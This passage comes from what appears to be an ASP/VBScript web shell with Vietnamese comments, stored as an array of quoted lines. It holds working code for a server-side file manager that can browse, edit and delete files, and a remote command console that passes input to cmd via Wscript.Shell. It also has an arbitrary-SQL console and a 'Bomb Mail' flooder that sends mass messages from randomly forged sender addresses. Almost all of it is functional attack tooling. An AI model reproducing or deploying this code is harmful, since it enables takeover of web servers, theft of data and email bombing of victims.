            "const charset=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\" ' tap ki thu dung de sinh chuoi ngau nhien",
            "zombie_array=array(\"com\",\"net\",\"org\",\"info\",\"vn\",\"cn\") ' mang cac domain z0mbie",
            "special_array=array(\"yahoo.com\",\"hotmail.com\") ' mang cac domain dac biet (dung trong bomb mail)",
            "root=Server.MapPath(\".\") ' folder mac dinh",
            "' ###########################################################################################",
            "gURL=Request.ServerVariables(\"SCRIPT_NAME\")",
            "Init()",
            "if (LCase(Left(Request.ServerVariables(\"HTTP_CONTENT_TYPE\"),19))=\"multipart/form-data\") and (Session(\"allow\")=1) and (Session(\"mode\")=0) then Upload()",
            "Secure()",
            "if Request.Form(\"command\")=\"Logout\" then Logout()",
            "if Request.Form(\"command\")=\"ChangeMode\" then",
            "\tSession(\"mode\")=Request.Form(\"mode\")",
            "\tSession(\"switch\")=true",
            "end if",
            "select case Session(\"mode\")",
            "\tcase 0 myFile()",
            "\tcase 1 myCMD()",
            "\tcase 2 mySQL()",
            "\tcase 3 myMail()",
            "end select",
            "'###########################################################################################",
            "sub myFile()",
            "\tif Session(\"switch\")=true then",
            "\t\ttargetPath=Session(\"targetPath\")",
            "\t\tif targetPath=\"\" then targetPath=root",
            "\t\tSession(\"switch\")=false",
            "\telse",
            "\t\ttargetPath=Trim(Request.Form(\"folder\"))",
            "\t\tif targetPath=\"\" then targetPath=root else targetPath=abspath(targetPath)",
            "\t\tselect case Request.Form(\"command\")",
            "\t\t\tcase \"Download\"",
            "\t\t\t\tDownload()",
            "\t\t\t\texit sub",
            "\t\t\tcase \"Edit\"",
            "\t\t\t\tEditor()",
            "\t\t\t\texit sub",
            "\t\t\tcase \"ChangeAttributesFile\",\"ChangeAttributesFolder\"",
            "\t\t\t\tChangeAttributesItem()",
            "\t\t\t\texit sub",
            "\t\t\tcase \"Tree\"",
            "\t\t\t\tTree()",
            "\t\t\t\texit sub",
            "\t\t\tcase \"Delete\" Delete()",
            "\t\t\tcase \"Move\" Move()",
            "\t\t\tcase \"Copy\" Copy()",
            "\t\t\tcase \"ZipInfo\" ZipInfo()",
            "\t\t\tcase \"NewFile\",\"NewFolder\" CreateItem()",
            "\t\t\tcase \"RenameFile\",\"RenameFolder\" RenameItem()",
            "\t\t\tcase \"OpenFolder\" OpenFolder()",
            "\t\t\tcase \"LevelUp\" targetPath=FSO.GetParentFolderName(abspath(Request.Form(\"folder\")))",
            "\t\t\tcase \"LevelRoot\" targetPath=findroot(abspath(Request.Form(\"folder\")))",
            "\t\tend select",
            "\t\tSession(\"targetPath\")=targetPath",
            "\tend if",
            "\tHtmlHeader(\"\")",
            "\tHtmlMode()",
            "\tList()",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub myCMD()",
            "\tdim bDoIt",
            "\tdim bEcho",
            "\tdim szTmpDir,szShell,szCmd,szTmpFile",
            "\tdim oScript,oScriptNet,oFile",
            "\tHtmlHeader(\"\")",
            "\tHtmlMode()",
            "\tset oScript=Server.CreateObject(\"Wscript.Shell\")",
            "\tset oScriptNet=Server.CreateObject(\"Wscript.Network\")",
            "\tszTmpDir=Trim(Request.Form(\"tmpdir\"))",
            "\tszShell=Trim(Request.Form(\"shell\"))",
            "\tszCmd=Trim(Request.Form(\"cmd\"))",
            "\tbEcho=CBool(Request.Form(\"echo\"))",
            "\tif Session(\"switch\")=true then",
            "\t\tSession(\"switch\")=false",
            "\t\tbDoit=false",
            "\t\tszTmpDir=Session(\"szTmpDir\")",
            "\t\tszShell=Session(\"szShell\")",
            "\t\tszCmd=Session(\"szCmd\")",
            "\t\tbEcho=Session(\"bEcho\")",
            "\telse",
            "\t\tbDoIt=true",
            "\tend if",
            "\tif szTmpDir=\"\" then szTmpDir=TmpDir else szTmpDir=abspath(szTmpDir)",
            "\tif szShell=\"\" then szShell=Shell",
            "\tSession(\"szTmpDir\")=szTmpDir",
            "\tSession(\"szShell\")=szShell",
            "\tSession(\"szCmd\")=szCmd",
            "\tSession(\"bEcho\")=bEcho",
            "<form name=frmCMD method=post action=\"<%=gURL%>\">",
            "<table>",
            "<tr><td><b>T</b>mpDir:</td><td><input type=text name=tmpdir value=\"<%=Server.HtmlEncode(szTmpDir)%>\" size=20></td></tr>",
            "<tr><td><b>S</b>hell:</td><td><input type=text name=shell value=\"<%=Server.HtmlEncode(szShell)%>\" size=20></td></tr>",
            "<tr><td><b>C</b>md:</td><td><input type=text name=cmd value=\"<%=Server.HtmlEncode(szCmd)%>\" size=80> <input type=submit value=Go></td></tr>",
            "<tr><td><b>E</b>cho:</td><td><input type=checkbox name=echo value=1<%if bEcho then Response.Write \" checked\"%>></td></tr>",
            "</table>",
            "</form>",
            "<script>frmCMD.cmd.focus()</script>",
            "\tif (szCmd<>\"\")  and (bDoIt=true) then",
            "\t\tif bEcho then",
            "\t\t\tcall oScript.Run(szShell & \" /c \" & szCmd)",
            "\t\telse",
            "\t\t\tszTmpFile = addslash(szTmpDir) & FSO.GetTempName",
            "\t\t\tcall oScript.Run(szShell & \" /c \" & szCmd & \" > \" & szTmpFile, 0, true)",
            "\t\t\tif FSO.FileExists(szTmpFile) then set oFile=FSO.OpenTextFile (szTmpFile, 1, false, 0)",
            "\t\tend if",
            "\tend if",
            "<p><%=FormatDate(Now)%>",
            "<p><b>I</b>P: <%=Request.ServerVariables(\"LOCAL_ADDR\")%><br>",
            "<b>U</b>ser: \\\\<%=oScriptNet.ComputerName%>\\\\<%=oScriptNet.UserName%>",
            "\tif (IsObject(oFile)) then",
            "\t\ton error resume next",
            "<pre>",
            "<%=Server.HtmlEncode(oFile.ReadAll)%>",
            "</pre>",
            "\t\toFile.Close",
            "\t\tcall FSO.DeleteFile(szTmpFile, true)",
            "\tend if",
            "\tset oScript=nothing",
            "\tset oScriptNet=nothing",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub mySQL()",
            "\tdim szConn,szSQL1,szSQL2,szSQL,bDoIt",
            "\tdim intChoice",
            "\tHtmlHeader(\"\")",
            "\tHtmlMode()",
            "\tszConn=Trim(Request.Form(\"conn\"))",
            "\tszSQL1=Trim(Request.Form(\"sql1\"))",
            "\tszSQL2=Trim(Request.Form(\"sql2\"))",
            "\tintChoice=CInt(Request.Form(\"choice\"))",
            "\tif Session(\"switch\")=true then",
            "\t\tSession(\"switch\")=false",
            "\t\tbDoIt=false",
            "\t\tszConn=Session(\"szConn\")",
            "\t\tszSQL1=Session(\"szSQL1\")",
            "\t\tszSQL2=Session(\"szSQL2\")",
            "\t\tintChoice=Session(\"intChoice\")",
            "\telse",
            "\t\tbDoIt=true",
            "\tend if",
            "\tif intChoice=0 then intChoice=1",
            "\tif intChoice=1 then szSQL=szSQL1 else szSQL=szSQL2",
            "\tSession(\"szConn\")=szConn",
            "\tSession(\"szSQL1\")=szSQL1",
            "\tSession(\"szSQL2\")=szSQL2",
            "\tSession(\"intChoice\")=intChoice",
            "\tselect case trim(ucase(szConn))",
            "\t\tcase \"MSSQL\" ",
            "\t\t\tszConn=cstrMSSQL",
            "\t\t\tszSQL=\"\"",
            "\t\tcase \"JET\"",
            "\t\t\tszConn=cstrJET",
            "\t\t\tszSQL=\"\"",
            "\t\tcase \"ACCESS\"",
            "\t\t\tszConn=cstrACCESS",
            "\t\t\tszSQL=\"\"",
            "\t\tcase \"ORACLE\"",
            "\t\t\tszConn=cstrORACLE",
            "\t\t\tszSQL=\"\"",
            "\t\tcase \"MYSQL\"",
            "\t\t\tszConn=cstrMYSQL",
            "\t\t\tszSQL=\"\"",
            "\t\tcase \"DSN\"",
            "\t\t\tszConn=cstrDSN",
            "\t\t\tszSQL=\"\"",
            "\tend select",
            "<input type=button value=\"<->\" onclick=\"changeInput()\">",
            "<form name=frmSQL method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=choice value=\"<%=intChoice%>\">",
            "<b>C</b>onn: <input type=text name=conn value=\"<%=Server.HtmlEncode(szConn)%>\" size=90> <br>",
            "<b>S</b>QL:&nbsp; <span id=s1<%if intChoice=2 then Response.Write \" style=\"\"display:none\"\"\"%>><input type=text name=sql1 value=\"<%=Server.HtmlEncode(szSQL1)%>\" size=90></span>",
            "<span id=s2<%if intChoice=1 then Response.Write \" style=\"\"display:none\"\"\"%>>( [F9] = Go )<br><textarea name=sql2 cols=42 rows=12 onkeydown=\"if (event.keyCode==120) frmSQL.submit();\"><%=Server.HtmlEncode(szSQL2)%></textarea><br></span>",
            "<input type=submit value=Go>",
            "</table>",
            "</form>",
            "<script>",
            "frmSQL.<%if szConn=\"\" then Response.Write \"conn\" else Response.Write \"sql\"&intChoice%>.focus();",
            "frmSQL.<%if szConn=\"\" then Response.Write \"conn\" else Response.Write \"sql\"&intChoice%>.focus();",
            "function changeInput() {",
            "\tif (s1.style.display=='none') {",
            "\t\ts1.style.display='inline';",
            "\t\ts2.style.display='none';",
            "\t\tfrmSQL.choice.value=\"1\";",
            "\t\tfrmSQL.sql1.focus();",
            "\t} else {",
            "\t\ts1.style.display='none';",
            "\t\ts2.style.display='inline';",
            "\t\tfrmSQL.choice.value=\"2\";",
            "\t\tfrmSQL.sql2.focus();",
            "</script>",
            "\t\tif (szConn<>\"\") and (szSQL<>\"\") and (bDoIt=true) then",
            "\t\tdim adoCon, rS",
            "\t\tdim i,intAffected",
            "\t\tset adoCon=Server.CreateObject(\"ADODB.Connection\")",
            "\t\tadoCon.Open szConn",
            "\t\tset rS=adoCon.Execute(szSQL, intAffected)",
            "\t\tif (rS.Fields.Count>0) then",
            "\t\t\t' hien thi ten cua cac truong",
            "\t\t\tResponse.Write \"<table border=1>\" & vbNewLine & \"<tr>\"",
            "\t\t\tfor i=0 to rS.Fields.Count-1",
            "\t\t\t\tResponse.Write \"<td><tt><b>\"",
            "\t\t\t\tif (rS.Fields(i).Name=\"\") then",
            "\t\t\t\t\tResponse.Write \"(No column name)\"",
            "\t\t\t\telse",
            "\t\t\t\t\tResponse.Write Server.HtmlEncode(rS.Fields(i).Name)",
            "\t\t\t\tend if",
            "\t\t\t\tResponse.Write \"</b></tt></td>\"",
            "\t\t\tnext",
            "\t\t\tResponse.Write \"</tr>\" & vbNewLine",
            "\t\t\t' hien thi du lieu tren cac dong",
            "\t\t\ton error resume next",
            "\t\t\trS.MoveFirst",
            "\t\t\tdo while not rS.EOF",
            "\t\t\t\tResponse.Write \"<tr>\"",
            "\t\t\t\tfor i=0 to rS.Fields.Count-1",
            "\t\t\t\t\tResponse.Write \"<td><tt>\"",
            "\t\t\t\t\tif  IsNull(rs.Fields(i).Value) then",
            "\t\t\t\t\t\tResponse.Write \"NULL\"",
            "\t\t\t\t\telseif (Trim(rs.Fields(i).Value)=\"\") then",
            "\t\t\t\t\t\tResponse.Write \"&nbsp;\"",
            "\t\t\t\t\telse",
            "\t\t\t\t\t\tResponse.Write Server.HtmlEncode(rS.Fields(i).Value)",
            "\t\t\t\t\tend if",
            "\t\t\t\t\tResponse.Write \"</tt></td>\"",
            "\t\t\t\tnext",
            "\t\t\t\tResponse.Write \"</tr>\" & vbNewLine",
            "\t\t\t\trS.MoveNext",
            "\t\t\tloop",
            "\t\t\trS.Close",
            "\t\t\tResponse.Write \"</table>\" & vbNewLine",
            "\t\tend if",
            "\t\tResponse.Write \"<p><tt>(\" & intAffected & \" row(s) affected)</tt>\"",
            "\t\tset rS=nothing",
            "\t\tset adoCon=nothing",
            "\tend if",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub myMail()",
            "\tdim strFrom,strTo,strSubject,strBody,bHtml,intNumber,i,StartTime,EndTime,bDoIt",
            "\tdim objMail,objMsg",
            "\tstrTo=Trim(Request.Form(\"to\"))",
            "\tselect case Request.Form(\"subcommand\")",
            "\t\tcase \"Send\"",
            "\t\t\tstrFrom=Trim(Request.Form(\"from\"))",
            "\t\t\tstrSubject=Trim(Request.Form(\"subject\"))",
            "\t\t\tstrBody=Request.Form(\"body\")",
            "\t\t\tbHtml=CBool(Request.Form(\"html\"))",
            "\t\tcase \"Bomb\"",
            "\t\t\tif IsNumeric(Request.Form(\"number\")) then intNumber=Int(Request.Form(\"number\"))",
            "\t\t\tstrFrom=Session(\"strFrom\")",
            "\t\t\tstrSubject=Session(\"strSubject\")",
            "\t\t\tstrBody=Session(\"strBody\")",
            "\t\t\tbHtml=Session(\"bHtml\")",
            "\tend select",
            "\tif Session(\"switch\")=true then",
            "\t\tSession(\"switch\")=false",
            "\t\tbDoIt=false",
            "\t\tstrFrom=Session(\"strFrom\")",
            "\t\tstrTo=Session(\"strTo\")",
            "\t\tstrSubject=Session(\"strSubject\")",
            "\t\tstrBody=Session(\"strBody\")",
            "\t\tbHtml=Session(\"bHtml\")",
            "\t\tintNumber=Session(\"intNumber\")",
            "\telse",
            "\t\tbDoIt=true",
            "\tend if",
            "\tif (intNumber<=0) then intNumber=gBomb",
            "\tSession(\"strFrom\")=strFrom",
            "\tSession(\"strTo\")=strTo",
            "\tSession(\"strSubject\")=strSubject",
            "\tSession(\"strBody\")=strBody",
            "\tSession(\"bHtml\")=bHtml",
            "\tSession(\"intNumber\")=intNumber",
            "\tHtmlHeader(\"\")",
            "\tHtmlMode()",
            "\tif bDoIt then",
            "\t\tselect case Request.Form(\"subcommand\")",
            "\t\t\tcase \"Send\"",
            "\t\t\t\tif IsValidEmail(strTo) then",
            "\t\t\t\t\tset objMail=Server.CreateObject(\"CDONTS.NewMail\")",
            "\t\t\t\t\tobjMail.To=strTo",
            "\t\t\t\t\tobjMail.From=strFrom",
            "\t\t\t\t\tobjMail.Subject=strSubject",
            "\t\t\t\t\tobjMail.Body=strBody",
            "\t\t\t\t\tif bHtml then",
            "\t\t\t\t\t\tobjMail.BodyFormat=0 'HTML",
            "\t\t\t\t\t\tobjMail.MailFormat=0 'MIME",
            "\t\t\t\t\tend if",
            "\t\t\t\t\tobjMail.Send",
            "\t\t\t\t\tset objMail=nothing",
            "\t\t\t\t\tResponse.Write \"<b>M</b>essage was sent to \" & strTo & \" successfully.\" & vbNewLine",
            "\t\t\t\tend if",
            "\t\t\tcase \"Bomb\"",
            "\t\t\t\tif IsValidEmail(strTo) then",
            "\t\t\t\t\tResponse.Write \"<b>B</b>ombing \" & Replace(FormatNumber(intNumber,0),\",\",\".\") & \" mail\"",
            "\t\t\t\t\tif intNumber>1 then Response.Write \"s\"",
            "\t\t\t\t\tResponse.Write \" to \" & strTo & \" ... \"",
            "\t\t\t\t\tStartTime=Timer",
            "\t\t\t\t\tset objMsg=Server.CreateObject(\"CDO.Message\")",
            "\t\t\t\t\tobjMsg.To=strTo",
            "\t\t\t\t\tRandomize",
            "\t\t\t\t\tfor i=1 to intNumber",
            "\t\t\t\t\t\tobjMsg.From=makeEmail()",
            "\t\t\t\t\t\tobjMsg.Subject=makeText(Int((50-25+1)*Rnd+25))",
            "\t\t\t\t\t\tobjMsg.TextBody=makeText(Int((100-50+1)*Rnd+50))",
            "\t\t\t\t\t\tobjMsg.Send",
            "\t\t\t\t\tnext",
            "\t\t\t\t\tset objMsg=nothing",
            "\t\t\t\t\tEndTime=Timer",
            "\t\t\t\t\tResponse.Write howlong(EndTime-StartTime) & vbNewLine",
            "\t\t\t\tend if",
            "\t\tend select",
            "\tend if",
            "<table border=1>",
            "<tr>",
            " <td width=50%>",
            " <form name=frmSend method=post action=\"<%=gURL%>\">",
            " <table>",
            " <tr>",
            "  <td colspan=2>a) <b>A</b>nonymous Mail</td>",
            " </tr>",
            " <tr>",
            "  <td><b>F</b>rom:</td>",
            "  <td><input type=text name=from value=\"<%=Server.HtmlEncode(strFrom)%>\" size=25></td>",
            " </tr>",
            " <tr>",
            "  <td><b>T</b>o:</td>",
            "  <td><input type=text name=to value=\"<%=Server.HtmlEncode(strTo)%>\" size=25></td>",
            " </tr>",
            " <tr>",
            "  <td><b>S</b>ubject:</td>",
            "  <td><input type=text name=subject value=\"<%=Server.HtmlEncode(strSubject)%>\" size=50></td>",
            " </tr>",
            " <tr>",
            "  <td valign=top><b>B</b>ody:</td>",
            "  <td><textarea name=body cols=37 rows=12><%=Server.HtmlEncode(strBody)%></textarea></td>",
            " </tr>",
            " <tr>",
            "  <td><b>H</b>tml:</td>",
            "  <td><input type=checkbox name=html value=1<%if bHtml=true then Response.Write \" checked\"%>></td>",
            " </tr>",
            " <tr>",
            "  <td colspan=2><input type=submit name=subcommand value=Send></td>",
            " </tr>",
            " </table>",
            " </form>",
            " </td>",
            " <td width=50% valign=top>",
            " <form name=frmBomb method=post action=\"<%=gURL%>\">",
            " <table>",
            " <tr>",
            "  <td colspan=2>b) <b>B</b>omb Mail</td>",
            " </tr>",
            " <tr>",
            "  <td><b>A</b>ddress:</td>",
            "  <td><input type=text name=to value=\"<%=Server.HtmlEncode(strTo)%>\" size=25></td>",
            " </tr>",
            " <tr>",
            "  <td><b>N</b>umber:</td>",
            "  <td><input type=text name=number value=<%=intNumber%>></td>",
            " </tr>",
            " <tr>",
            "  <td colspan=2><input type=submit name=subcommand value=Bomb></td>",
            " </tr>",
            " </table>",
            " </form>",
            " </td>",
            "</tr>",
            "</table>",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "function IsValidEmail(strEAddress)",
            "\tdim objRegExpr",
            "\tset objRegExpr = New RegExp",
            "\tobjRegExpr.Pattern = \"^[a-zA-Z0-9][\\w\\.-]*[a-zA-Z0-9]@[\\w-\\.]*[a-zA-Z0-9]\\.[a-zA-Z]{2,7}$\"",
            "\tobjRegExpr.Global = true",
            "\tobjRegExpr.IgnoreCase = False",
            "\tIsValidEmail = objRegExpr.Test(strEAddress)",
            "\tset objRegExpr = nothing",
            "end function",
            "'###########################################################################################",
            "function makeEmail()",
            "\tRandomize",
            "\tif Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\" & zombie_array(Int((UBound(zombie_array)-0+1)*Rnd+0)) else makeEmail=makeText(8) & \"@\" & special_array(Int((UBound(special_array)-0+1)*Rnd+0))",
            "end function",
            "'###########################################################################################",
            "function makeText(intLen)",
            "\tdim strNewText,i",
            "\tstrNewText=\"\"",
            "\tRandomize",
            "\tfor i=1 to intLen",
            "\t\tstrNewText=strNewText & Mid(charset,Int((Len(charset)-1+1)*Rnd+1),1)",
            "\tnext",
            "\tmakeText=strNewText",
            "end function",
            "'###########################################################################################",
            "function howlong(intTime)",
            "\tif (intTime<60) then",
            "\t\thowlong=intTime & \" second(s)\"",
            "\telseif (intTime<60*60) then",
            "\t\thowlong=FormatNumber(intTime/60,2) & \" minute(s)\"",
            "\telse",
            "\t\thowlong=FormatNumber(intTime/(60*60),2) & \" hour(s)\"",
            "\tend if",
            "end function",
            "'###########################################################################################",
            "sub Tree()",
            "\tdim path",
            "\tpath=abspath(Request.Form(\"param\"))",
            "\tif FSO.FolderExists(path) then",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">",
            "<title><%=path%></title>",
            "<style>",
            "body,td{font-family:Fixedsys}",
            "a{color:#0000ff}",
            "</style>",
            "</head>",
            "<body bgcolor=#000000 text=#ffffff>",
            "\t\ttree_dir(path)",
            "</body>",
            "</html>",
            "\telse",
            "<script>alert('Folder not found !');window.close();</script>",
            "\tend if",
            "\tDestroy()",
            "end sub",
            "sub tree_dir(path)",
            "\tdim strAttrib,strSize",
            "\ton error resume next",
            "\tdim oFolder",
            "\tdim oSubFolders,oSubFolder",
            "\tdim oFiles,oFile",
            "\tdim oSubFolders2,oSubFolder2",
            "\tdim oFiles2,oFile2",
            "\tset oFolder=FSO.GetFolder(path)",
            "\tset oSubFolders=oFolder.SubFolders",
            "\tset oFiles=oFolder.Files",
            "\tResponse.Write \"<p>\" & FSO.GetAbsolutePathName(path)",
            "\tstrAttrib=GetAttributes(oFolder.Attributes)",
            "\tif strAttrib<>\"&nbsp;\" then Response.Write \" (\" & GetAttributes(oFolder.Attributes) & \")\"",
            "\tResponse.Write vbNewLine",
            "\tif (oSubFolders.Count>0) or (oFiles.Count>0) then",
            "<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>",
            "<tr bgcolor=#000000>",
            " <td><font color=#FFFF00>Name</font></td>",
            " <td align=center><font color=#FFFF00>Size</font></td>",
            " <td align=center><font color=#FFFF00>Type</font></td>",
            " <td align=center><font color=#FFFF00>Modified</font></td>",
            " <td align=center><font color=#FFFF00>Attributes</font></td>",
            "</tr>",
            "\t\t' liet ke thu muc",
            "\t\tfor each oSubFolder in oSubFolders",
            "<tr bgcolor=#000000>",
            " <td><%=oSubFolder.Name%></td>",
            " <td align=right>&nbsp;</td>",
            " <td align=center>DIR</td>",
            " <td align=center><%=FormatDate(oSubFolder.DateLastModified)%></td>",
            " <td><%=GetAttributes(oSubFolder.Attributes)%></td>",
            "</tr>",
            "\t\tnext",
            "\t\t' liet ke file",
            "\t\tfor each oFile in oFiles",
            "<tr bgcolor=#000000>",
            " <td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"url\") then Response.Write \" title=\"\"\" & FindLink(path & \"\\\" & oFile.Name) & \"\"\"\"%>><%=oFile.Name%></td>",
            " <td align=right><%=FormatSize(oFile.Size)%></td>",
            " <td align=center><%=oFile.Type%></td>",
            " <td align=center><%=FormatDate(oFile.DateLastModified)%></td>",
            " <td><%=GetAttributes(oFile.Attributes)%></td>",
            "</tr>",
            "\t\tnext",
            "\t\tstrSize=FormatSize(oFolder.Size)",
            "<tr bgcolor=#000000>",
            " <td colspan=5 align=center><%=oSubFolders.Count%> folder(s), <%=oFiles.Count%> file(s)<%if strSize<>\"\" then Response.Write \" (\" & strSize & \")\"%></td>",
            "</tr>",
            "</table>",
            "\t\t' goi de qui",
            "\t\tfor each oSubFolder in oSubFolders",
            "\t\t\tset oSubFolder2=oSubFolder.SubFolders",
            "\t\t\tset oFile2=oSubFolder.Files",
            "\t\t\tif (oSubFolder2.Count>0) or (oFile2.Count>0) then",
            "\t\t\t\ttree_dir(oSubFolder.ParentFolder & \"\\\" & oSubFolder.Name)",
            "\t\t\tend if",
            "\t\t\tset oSubFolder2=nothing",
            "\t\t\tset oFile2=nothing",
            "\t\tnext",
            "\tend if",
            "\tset oSubFolder=nothing",
            "\tset oFiles=nothing",
            "\tset oFolder=nothing",
            "end sub",
            "'###########################################################################################",
            "sub Editor()",
            "\tdim f,name,path",
            "\ton error resume next",
            "\tHtmlHeader(\"\")",
            "\tname=Request.Form(\"param\")",
            "\tpath=addslash(targetPath) & name",
            "\tselect case Request.Form(\"subcommand\")",
            "\t\tcase \"Save\",\"SaveAs\"",
            "\t\t\tset f=FSO.OpenTextFile(path,2,true,-2)",
            "\t\t\tif Err.Number<>0 then",
            "\t\t\t\tgMsg=\"Can not write to the file \"\"\" & name & \"\"\", permission denied!\"",
            "\t\t\t\tErr.Clear",
            "\t\t\telse",
            "\t\t\t\tf.Write Request.Form(\"content\")",
            "\t\t\tend if",
            "\t\t\tset f=nothing",
            "\t\t\tset f=FSO.OpenTextFile(path,1,false,-2)",
            "\t\tcase else",
            "\t\t\tif not FSO.FileExists(path) then",
            "\t\t\t\tgMsg=\"The file \"\"\" & name & \"\"\" does not exist\"",
            "\t\t\t\tset f=FSO.CreateTextFile(path,false)",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=gMsg & \", also unable to create new file.\"",
            "\t\t\t\t\tErr.Clear",
            "\t\t\t\telse",
            "\t\t\t\t\tgMsg=gMsg & \", created new file.\"",
            "\t\t\t\tend if",
            "\t\t\telse",
            "\t\t\t\tset f=FSO.OpenTextFile(path,1,false,-2)",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=\"Can not read from the file \"\"\" & name & \"\"\", permission denied!\"",
            "\t\t\t\t\tErr.Clear",
            "\t\t\t\tend if",
            "\t\t\tend if",
            "\tend select",
            "<% if gMsg<>\"\" then Response.Write \"<script>alert('\" & gMsg & \"')</script>\" & vbNewLine %>",
            "<p><b>E</b>diting - \"<%=path%>\"<br>",
            "<form name=frmFile method=post action=\"<%=gURL%>\">",
            "<b>W</b>rap<input type=checkbox id=wrap onclick=\"EditorCommand('WordWrap')\">",
            "<center>",
            "<table width=100%>",
            "<tr><td align=center>",
            "<textarea name=content rows=25 cols=46 style=\"width:580;height:330\" wrap=off><%=Server.HTMLEncode(f.ReadAll)%></textarea>",
            "</td></tr>",
            "<tr><td align=center>",
            "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=button value=\"Save As\" onclick=\"EditorCommand('SaveAs')\"> <input type=button value=Reload onclick=\"EditorCommand('Reload')\"> <input type=button value=Close onclick=\"window.close()\">",
            "</td></tr>",
            "</table>",
            "</center>",
            "<script>frmFile.content.focus()</script>",
            "<input type=hidden name=command value=Edit>",
            "<input type=hidden name=subcommand value=\"\">",
            "<input type=hidden name=param value=\"<%=name%>\">",
            "<input type=hidden name=folder value=\"<%=Request.Form(\"folder\")%>\">",
            "</form>",
            "\tset f=nothing",
            "\tHtmlJsEditor()",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub ChangeAttributesItem()",
            "\tdim item,itemType,itemName,itemPath,itemAttrib",
            "\titemType=Request.Form(\"command\")",
            "\titemName=Request.Form(\"param\")",
            "\titemPath=addslash(targetPath) & itemName",
            "\tHtmlHeader(\"\")",
            "\tselect case itemType",
            "\t\tcase \"ChangeAttributesFile\" set item=FSO.GetFile(itemPath)",
            "\t\tcase \"ChangeAttributesFolder\" set item=FSO.GetFolder(itemPath)",
            "\tend select",
            "\tif Request.Form(\"subcommand\")=\"change\" then",
            "\t\titemAttrib=int(Request.Form(\"r\"))",
            "\t\titemAttrib=itemAttrib+int(Request.Form(\"h\"))",
            "\t\titemAttrib=itemAttrib+int(Request.Form(\"a\"))",
            "\t\titemAttrib=itemAttrib+int(Request.Form(\"s\"))",
            "\t\ton error resume next",
            "\t\titem.Attributes=int(itemAttrib)",
            "\t\tif Err.Number<>0 then Response.Write \"<script>alert('Permission denined')</script>\" & vbNewLine",
            "\tend if",
            "\titemAttrib=item.Attributes",
            "<b>C</b>hange attributes - \"<%=itemName%>\"",
            "<p align=center>",
            "<form name=frmAttrib method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=command value=\"<%=itemType%>\">",
            "<input type=hidden name=subcommand value=change>",
            "<input type=hidden name=folder value=\"<%=targetPath%>\">",
            "<input type=hidden name=param value=\"<%=itemName%>\">",
            "<table>",
            "<tr>",
            " <td><input type=checkbox name=r value=1 <%if (itemAttrib and 1)>0 then Response.Write \" checked\"%>>Read-only</td>",
            " <td><input type=checkbox name=h value=2 <%if (itemAttrib and 2)>0 then Response.Write \" checked\"%>>Hidden</td>",
            "</tr>",
            "<tr>",
            " <td><input type=checkbox name=a value=32 <%if (itemAttrib and 32)>0 then Response.Write \" checked\"%>>Archive</td>",
            " <td><input type=checkbox name=s value=4 <%if (itemAttrib and 4)>0 then Response.Write \" checked\"%>>System</td>",
            "</tr>",
            "</table><br>",
            "<input type=button value=OK onclick=\"frmAttrib.submit()\"> <input type=button value=Close onclick=\"window.close()\">",
            "</form>",
            "</p>",
            "\tset itemType=nothing",
            "\tHtmlFooter()",
            "\tDestroy()",
            "end sub",
            "'###########################################################################################",
            "sub OpenFolder()",
            "\tif Trim(Request.Form(\"folder\"))=\"\" then ",
            "\t\tif Trim(Request.Form(\"param\"))=\"\" then targetPath=root else targetPath=abspath(Trim(Request.Form(\"param\")))",
            "\telse",
            "\t\ttargetPath=addslash(Trim(Request.Form(\"folder\"))) & Trim(Request.Form(\"param\"))",
            "\tend if",
            "end sub",
            "'###########################################################################################",
            "sub CreateItem()",
            "\tdim itemType,itemName,itemPath\t",
            "\titemType=request.form(\"command\")",
            "\titemName=request.form(\"param\")",
            "\titemPath=addslash(targetPath) & itemName",
            "\ton error resume next",
            "\tselect case itemType",
            "\t\tcase \"NewFolder\"",
            "\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then",
            "\t\t\t\tFSO.CreateFolder(itemPath)",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=\"Unable to create the folder \"\"\" & itemName & \"\"\", an error occured...\"",
            "\t\t\t\telse",
            "\t\t\t\t\tgMsg=\"Created the folder \"\"\" & itemName & \"\"\"...\"",
            "\t\t\t\tend if",
            "\t\t\telse",
            "\t\t\t\tgMsg=\"Unable to create the folder \"\"\" & itemName & \"\"\", there exists a file or a folder with the same name...\"",
            "\t\t\tend if",
            "\t\tcase \"NewFile\"",
            "\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then",
            "\t\t\t\tFSO.CreateTextFile(itemPath)",
            "\t\t\t\tif Err.Number<>0 then",
            "\t\t\t\t\tgMsg=\"Unable to create the file \"\"\" & itemName & \"\"\", an error occured...\"",
            "\t\t\t\telse",
            "\t\t\t\t\tgMsg=\"Created the file \"\"\" & itemName & \"\"\"...\"",
            "\t\t\t\tend if",
            "\t\t\telse",
            "\t\t\t\tgMsg=\"Unable to create the file \"\"\" & itemName & \"\"\", there exists a file or a folder with the same name...\"",
            "\t\t\tend if",
            "\tend select",
            "end sub",
            "'###########################################################################################",
            "sub ZipInfo()",
            "\tdim path,zip,zipfile,i",
            "\tpath=addslash(targetPath) & Request.Form(\"param\")",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">",
            "<title><%=path%></title>",
            "<style>",
